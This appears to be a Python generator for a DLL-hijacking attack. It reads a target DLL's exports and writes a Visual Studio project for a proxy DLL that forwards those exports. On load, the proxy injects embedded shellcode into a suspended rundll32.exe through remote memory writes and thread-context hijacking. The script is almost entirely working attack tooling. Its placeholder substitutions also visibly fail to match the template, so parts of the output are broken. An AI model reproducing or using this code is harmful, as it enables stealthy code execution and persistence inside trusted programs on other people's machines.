import os
import sys

import pefile


def main():
    try:
        filepath = sys.argv[1]
        pe = pefile.PE(filepath)
        exportTable = pe.DIRECTORY_ENTRY_EXPORT.symbols
        print("[!]Find export function :[%d]\r\n" % len(exportTable))

        for sym in exportTable:
            print("%2s %8s" % (sym.ordinal, sym.name.decode('utf8')))

        dllname = os.path.basename(os.path.splitext(filepath)[0])
        folder = os.getcwd() + '\\' + dllname
        is32bit = pe.FILE_HEADER.Characteristics & 0x100

        print("\r\n[+] Generating VS2019 Project for DLLHijacker in folder: %s" % folder)
        hijacker(dllname, folder, exportTable, is32bit)

        print("successfully generated a DLLHijack Project of " + dllname)
    except Exception as e:
      print("[-]Error occur: %s" % e)


def usage():
    print("Usage:")
    print("%s target.dll" % sys.argv[0])

def hijacker(dllname, gen_folder, symbols, is32bit):
    os.mkdir(gen_folder)
    sub_folder = gen_folder + '\\' + dllname
    os.mkdir(sub_folder)

# dllmain.cpp
    dllmain = '''# include "pch.h"


# define EXTERNC extern "C"
# define NAKED __declspec(naked)
# define EXPORT EXTERNC __declspec(dllexport)
# define ALCPP EXPORT NAKED
# define ALSTD EXTERNC EXPORT NAKED void __stdcall
# define ALCFAST EXTERNC EXPORT NAKED void __fastcall
# define ALCDECL EXTERNC NAKED void __cdecl

X64DLLHIJACKER_DEF

namespace DLLHijacker
{
    HMODULE m_hModule = NULL;
    DWORD m_dwReturn[17] = {0};

    inline BOOL WINAPI Load()
    {
        TCHAR tzPath[MAX_PATH];
        lstrcpy(tzPath, TEXT("TEAMPLATE_DLLNAME"));
        m_hModule = LoadLibrary(tzPath);
        if (m_hModule == NULL)
            return FALSE;
        return (m_hModule != NULL);
    }

    FARPROC WINAPI GetAddress(PCSTR pszProcName)
    {
        FARPROC fpAddress;
        CHAR szProcName[16];
        fpAddress = GetProcAddress(m_hModule, pszProcName);
        if (fpAddress == NULL)
        {
            if (HIWORD(pszProcName) == 0)
            {
                wsprintf((LPWSTR)szProcName, L"%d", pszProcName);
                pszProcName = szProcName;
            }
            ExitProcess(-2);
        }
        return fpAddress;
    }
}

using namespace DLLHijacker;

HIJACKFUNC

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        DisableThreadLibraryCalls(hModule);
        if(Load())
        {
            X64DLLHIJACKER_PROC
            Hijack();

        }

    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

X86DLLHIJACKER_PROC
'''

    get_proc_addr = ''
    for sym in symbols:
        if is32bit:
            get_proc_addr += '''ALCDECL Hijack_%s(void)\n{\n\t\t__asm POP m_dwReturn[0 *TYPE long];\n\t\tGetAddress("%s")();\n\t\t__asm JMP m_dwReturn[0 * TYPE long];\n}\r\n''' % (
                sym.name.decode('utf8'), sym.name.decode('utf8'))
        else:
            get_proc_addr += '''Hijack_%s = GetAddress("%s");\n\t\t''' % (
                sym.name.decode('utf8'), sym.name.decode('utf8'))

    if is32bit:
        dllmain = dllmain.replace('X64DLLHIJACKER_DEF', '')
        dllmain = dllmain.replace('X64DLLHIJACKER_PROC', '')
        dllmain = dllmain.replace('X86DLLHIJACKER_PROC', get_proc_addr)
    else:
        export_def = '''EXTERNC \n{\n'''
        asm = ''  # dllname.asm
        for sym in symbols:
            export_def += '''\t\tFARPROC Hijack_%s;\n''' % sym.name.decode(
                'utf8')
            asm += '''extern Hijack_%s: DQ\n''' % sym.name.decode('utf8')
        export_def += "\n}"
        asm += '''\n.code\n'''
        for sym in symbols:
            asm += '''Hijack%s proc\n\t\tjmp Hijack_%s\nHijack%s endp\n''' % (
                sym.name.decode('utf8'), sym.name.decode('utf8'), sym.name.decode('utf8'))
        asm += 'end'

        with open(sub_folder + '\\' + dllname + '.asm', "w") as f:
            f.writelines(asm)

        dllmain = dllmain.replace('X64DLLHIJACKER_DEF', export_def)
        dllmain = dllmain.replace('X64DLLHIJACKER_PROC', get_proc_addr)
        dllmain = dllmain.replace('X86DLLHIJACKER_PROC', '')

    hijackfunc = r'''VOID Hijack()   //default open a calc.
{   
    unsigned char shellcode_calc[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
		"\x63\x2e\x65\x78\x65\x00";

  TCHAR CommandLine[] = TEXT("c:\\windows\\system32\\rundll32.exe");

	CONTEXT Context; // [sp+0h] [bp-324h]@2
	struct _STARTUPINFOA StartupInfo; // [sp+2CCh] [bp-58h]@1
	struct _PROCESS_INFORMATION ProcessInformation; // [sp+310h] [bp-14h]@1
	LPVOID lpBaseAddress; // [sp+320h] [bp-4h]@    

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = REPLACE_0X1;
	if (CreateProcess(0, CommandLine, 0, 0, 0, 0x44, 0, 0, (LPSTARTUPINFOW)&StartupInfo, &ProcessInformation)) {
		Context.ContextFlags = REPLACE_0X2; 65539
		GetThreadContext(ProcessInformation.hThread, &Context);
		lpBaseAddress = VirtualAllocEx(ProcessInformation.hProcess, 0, 0x800u, 0x1000u, 0x40u);
		WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, &shellcode_calc, 0x800u, 0);
		Context.REPLACE_0X3 = (REPLACE_0X4)lpBaseAddress;
		SetThreadContext(ProcessInformation.hThread, &Context);
		ResumeThread(ProcessInformation.hThread);
		CloseHandle(ProcessInformation.hThread);
		CloseHandle(ProcessInformation.hProcess);
	}
}
'''
    if is32bit:
      hijackfunc = hijackfunc.replace('EREPLACE_0X1', '68')
      hijackfunc = hijackfunc.replace('EREPLACE_0X2', '65539')
      hijackfunc = hijackfunc.replace('EREPLACE_0X3', 'Eip')
      hijackfunc = hijackfunc.replace('EREPLACE_0X4', 'DWORD')
    else:
      hijackfunc = hijackfunc.replace('EREPLACE_0X1', '104')
      hijackfunc = hijackfunc.replace('EREPLACE_0X2', '1048579')
      hijackfunc = hijackfunc.replace('EREPLACE_0X3', 'Rip')
      hijackfunc = hijackfunc.replace('EREPLACE_0X4', 'DWORD64')


    dllmain = dllmain.replace('TEAMPLATE_DLLNAME', dllname)
    dllmain = dllmain.replace('HIJACKFUNC', hijackfunc)

    with open(sub_folder + '\\' + 'dllmain.cpp', "w") as f:
        f.writelines(dllmain)


# source.def
    export_text = '''LIBRARY\nEXPORTS\n\n'''
    for sym in symbols:
        export_text += '''%s=Hijack%s @%d\n''' % (
            sym.name.decode('utf8'), sym.name.decode('utf8'), sym.ordinal)
    with open(sub_folder + r'\Source.def', "w") as f:
        f.writelines(export_text)

# VS2019 Project resources
    txtPchHeader = '''# ifndef PCH_H
# define PCH_H

# include "framework.h"

# endif //PCH_H
'''

    with open(sub_folder + r'\pch.h', "w") as f:
        f.writelines(txtPchHeader)

    txtPchCpp = '''# include "pch.h"'''
    with open(sub_folder + r'\pch.cpp', "w") as f:
      f.writelines(txtPchCpp)

    txtFramework = '''# pragma once

# define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
# include <windows.h>
'''

    with open(sub_folder + r'\framework.h', "w") as f:
        f.writelines(txtFramework)

    txtSln = r'''Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.28803.202
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "TEMPLATE_DLLNAME", "TEMPLATE_DLLNAME\TEMPLATE_DLLNAME.vcxproj", "{045DE335-9952-4554-9976-E325765903C8}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{045DE335-9952-4554-9976-E325765903C8}.Debug|x64.ActiveCfg = Debug|x64
		{045DE335-9952-4554-9976-E325765903C8}.Debug|x64.Build.0 = Debug|x64
		{045DE335-9952-4554-9976-E325765903C8}.Debug|x86.ActiveCfg = Debug|Win32
		{045DE335-9952-4554-9976-E325765903C8}.Debug|x86.Build.0 = Debug|Win32
		{045DE335-9952-4554-9976-E325765903C8}.Release|x64.ActiveCfg = Release|x64
		{045DE335-9952-4554-9976-E325765903C8}.Release|x64.Build.0 = Release|x64
		{045DE335-9952-4554-9976-E325765903C8}.Release|x86.ActiveCfg = Release|Win32
		{045DE335-9952-4554-9976-E325765903C8}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {8AE89278-B9CB-44F9-835C-7B718051F073}
	EndGlobalSection
EndGlobal
'''
    txtSln = txtSln.replace('TEMPLATE_DLLNAME', dllname)
    with open(gen_folder + '\\' + dllname + '.sln', "w+") as f:
        f.writelines(txtSln)

    txtVcxproj = r'''<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <ProjectGuid>{045DE335-9952-4554-9976-E325765903C8}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>demodll</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;DEMODLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
      <ModuleDefinitionFile>Source.def</ModuleDefinitionFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;DEMODLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
      <ModuleDefinitionFile>Source.def</ModuleDefinitionFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;DEMODLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
      <ModuleDefinitionFile>Source.def</ModuleDefinitionFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;DEMODLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableUAC>false</EnableUAC>
      <ModuleDefinitionFile>Source.def</ModuleDefinitionFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="framework.h" />
    <ClInclude Include="pch.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="dllmain.cpp" />
    <ClCompile Include="pch.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="Source.def" />
  </ItemGroup>
X64ITEM
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
'''

    if is32bit:
        txtVcxproj = txtVcxproj.replace("X64ITEM", '')
    else:
        txtVcxproj = txtVcxproj.replace("X64ITEM", ''' <ItemGroup>
    <CustomBuild Include="TEMPLATE_DLLNAME.asm">
      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</ExcludedFromBuild>
      <FileType>Document</FileType>
      <Command Condition="'$(Configuration)|$(Platform)'=='Release|x64'">ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).asm</Command>
      <Outputs Condition="'$(Configuration)|$(Platform)'=='Release|x64'">$(IntDir)%(fileName).obj</Outputs>
    </CustomBuild>
  </ItemGroup>
''').replace('TEMPLATE_DLLNAME', dllname)

        with open(sub_folder + '\\' + dllname + '.vcxproj', "w") as f:
            f.write(txtVcxproj)

    txtFilter = r'''<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="源文件">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="头文件">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="资源文件">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="framework.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="pch.h">
      <Filter>头文件</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="dllmain.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
    <ClCompile Include="pch.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="Source.def">
      <Filter>源文件</Filter>
    </None>
  </ItemGroup>
X64ITEM
</Project>
'''

    if is32bit:
        txtFilter = txtFilter.replace('X64ITEM', '')
    else:
        txtFilter = txtFilter.replace('X64ITEM', '''  <ItemGroup>
    <CustomBuild Include="TEMPLATE_DLLNAME.asm">
      <Filter>源文件</Filter>
    </CustomBuild>
  </ItemGroup>
''').replace('TEMPLATE_DLLNAME', dllname)

        with open(sub_folder + '\\' + dllname + '.vcxproj.filters', "w") as f:
            f.write(txtFilter)


if __name__ == "__main__":
    if(len(sys.argv) < 2):
        usage()
    else:
        main()
